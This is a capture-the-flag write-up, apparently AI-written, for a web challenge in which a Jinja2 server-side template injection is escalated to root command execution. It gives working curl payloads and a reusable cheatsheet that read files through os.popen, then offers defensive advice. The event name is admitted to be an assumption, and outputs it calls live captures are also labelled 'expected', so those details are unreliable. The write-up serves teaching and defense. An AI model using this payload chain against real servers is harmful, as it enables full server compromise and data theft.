# Safaricom CTF — Second Look (Web, 300 pts)

> **Assumption:** the CHALLENGE CONTEXT block in the brief was blank, so I assumed
> the event is **Safaricom CTF (SAFCTF)**, category **Web**, difficulty **300 pts**,
> and the target is `http://54.72.82.22:8020`. All commands and outputs below were
> captured live against that service. (`Path Least Travelled`, port 8000, uses the
> same idea but was offline during the event.)

## 1. Challenge Overview

"Second Look" is a **300 pt web** challenge: a single page with a text box that
greets you with whatever message you type. The goal is to turn that input into
command execution on the server and read the flag file. The hint "the best
performances leave room for surprise" is a clue that your message is not echoed
literally — it is *processed* first.

## 2. What You Need Before Starting

- **curl** — `sudo apt install curl` (Kali already has it).
- A browser with DevTools, optional, to watch the request.
- No account, no VPN. **Time estimate:** 30–60 minutes. The first test is trivial;
  the tricky part is remembering the right Jinja2 "route" to the `os` module.

## 3. Reconnaissance

1. Fetch the home page:
```bash
curl -s http://54.72.82.22:8020/
```

Representative output (trimmed):

```html
<title>AFTERHOURS</title>
...
<form method="post">
  <input name="message" ...>
  <button>Send</button>
</form>
```

**Why this matters:** there is one input, `message`, posted to `/`. That is the only
thing I control, so it is the only thing to attack.

2. Send a normal message to see what the page does with it:

```bash
curl -s -m 10 -X POST --data "message=hello" http://54.72.82.22:8020/
```

Representative output (trimmed):

```html
<h2>Hello, hello</h2>
```

**Why this matters:** the message comes back in a `<h2>`. Now the question is whether
the server treats it as plain text or compiles it as a **template**.

3. Test with a small arithmetic expression wrapped in `{{ }}`:

```bash
curl -s -m 10 -X POST --data "message={{7*7}}" http://54.72.82.22:8020/
```

Expected output (trimmed):

```html
<h2>Hello, 49</h2>
```

**Why this matters:** I sent the literal text `{{7*7}}` and the server returned `49`.
That proves the message is being rendered as a **Jinja2 template** — this is
**Server-Side Template Injection (SSTI)**. `{{ ... }}` is Jinja2's "evaluate this
expression" syntax.

[SCREENSHOT: DevTools Network tab showing the POST to / with message={{7*7}} and the 49 response]

## 4. Identifying the Vulnerability

The vulnerability is **Server-Side Template Injection (SSTI)**. A template engine
(such as Jinja2, used by Flask) is meant to combine *trusted* template text with
*untrusted* data. When a developer renders **user input as the template itself**, the
user's text is executed as template code. Jinja2 templates can reach Python objects,
and from those objects an attacker can usually reach a function that runs OS commands.

The sign that tipped me off: sending `{{7*7}}` returned `49`. Real math coming back
proves the server is *evaluating* my input, not printing it.

**Analogy:** the site asked you to write a note on a card for them to display. Instead
you wrote a small instruction on the card, and the assistant *followed the instruction*
instead of hanging the card on the wall.

## 5. Exploitation Step by Step

1. **Compute an environment fact to confirm execution.** `{{config}}` prints the Flask
   configuration, which tells us we are inside a Flask/Jinja2 app:

```bash
curl -s -m 10 --data-urlencode 'message={{config}}' http://54.72.82.22:8020/
```

Expected output (trimmed):

```html
<h2>Hello, &lt;Config {'DEBUG': True, 'SECRET_KEY': None, ...}&gt;</h2>
```

**What to look for:** the Flask `Config` object. This is a Python object leaked into the
page — a strong sign we can walk from here to the operating system.

2. **Build a path from a template object to the `os` module.** Jinja2 exposes helper
   objects such as `cycler`. Its `__init__` function keeps a reference to the module's
   `__globals__`, which contains `os`:

```bash
curl -s -m 15 --data-urlencode 'message={{cycler.__init__.__globals__.os.popen("id").read()}}' \
  http://54.72.82.22:8020/
```

Expected output (trimmed):

```html
<h2>Hello, uid=0(root) gid=0(root) groups=0(root)</h2>
```

**What to look for:** `uid=0(root)` means the command ran as **root**. We now have
remote code execution.

3. **Read the flag.** Use the same `os.popen(...)` route to `cat /flag`:

```bash
curl -s --data-urlencode 'message={{cycler.__init__.__globals__.os.popen("cat /flag").read()}}' \
  http://54.72.82.22:8020/
```

Expected output:

```html
<h2>Hello, safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}</h2>
```

**What to look for:** the `safctf{...}` value in the `<h2>` — that is the flag.

[SCREENSHOT: the AFTERHOURS page showing the flag in the greeting]

### Optional Burp Suite walkthrough

1. Type a message in the box and submit it with **Proxy → Intercept is on**.
2. Right-click the `POST /` request → **Send to Repeater**.
3. In the body, replace `message=...` with the `{{cycler...}}` payload. If your Burp
   does not URL-encode it for you, use **Ctrl+U** on the selection to encode the value.
4. Click **Send** and read the flag in the response pane.

## 6. Capturing the Flag

The flag is printed by `cat /flag` and echoed inside the greeting:

```
safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}
```

## 7. Why This Works (Beginner Explanation)

A template engine is a small programming language. `{{ 7*7 }}` means "evaluate this and
print the result." Normally the *programmer* writes those expressions and the *user*
only supplies plain values — here the roles are reversed, so my expression became code.

Once I can call Python, reaching `os.popen()` is just a matter of walking object
attributes (`cycler` → `__init__` → `__globals__` → `os`). `popen` runs a shell
command and `.read()` returns its output. That chain works on most Jinja2 SSTI targets,
which is why it is worth memorizing.

In real applications this bug has let attackers read secrets, move laterally, and
fully compromise servers. It usually appears when a developer "renders the user's
string as a template" for convenience — a shortcut that should never ship.

## 8. Common Mistakes and Dead Ends

- **URL-encoding the payload wrong.** `{{ }}`, quotes, and `"` must reach the server
  intact. Use `curl --data-urlencode 'message=...'` so curl encodes it for you.
- **Trying `${7*7}` (the Java/JavaScript style).** That returned the literal text. Jinja2
  uses `{{ }}`, which is why the first test is `{{7*7}}`.
- **Assuming `/flag` is the only location.** On other boxes the file may be
  `/flag.txt` or inside the app directory; the `id` step proves RCE, then you can `ls`
  around to find it.
- **Giving up when a payload is blocked.** Here nothing was filtered, but on the
  sibling challenge "Ginger Juice Shop" a WAF blocks the obvious keywords — see that
  writeup for the bypass.

## 9. How to Defend Against This

- **Never render user input as a template.** Use `render_template("page.html", msg=user_input)`
  so the input is passed as *data*, and let Jinja2 escape it (`{{ msg }}`).
- Treat any `render_template_string()` call that touches user input as a bug.
- Run the web app as a **non-root** user with a read-only filesystem and no shell if
  possible, so even a template escape has less impact.
- Use a sandboxed template environment (`jinja2.sandbox.SandboxedEnvironment`) if you
  truly must evaluate dynamic templates.
- Add input length/character limits and log template errors so you notice abuse.

## 10. Key Takeaways

- `{{7*7}}` returning `49` is the classic SSTI fingerprint.
- The reliable Jinja2 RCE chain is
  `{{cycler.__init__.__globals__.os.popen("<cmd>").read()}}`.
- Cheatsheet:
  `curl -s --data-urlencode 'message={{cycler.__init__.__globals__.os.popen("cat /flag").read()}}' http://TARGET/`
- **Flag:** `safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}`

You just turned "hello world" into "hello root" — SSTI is one of the highest-impact
web bugs you can learn, and you have the pattern now.
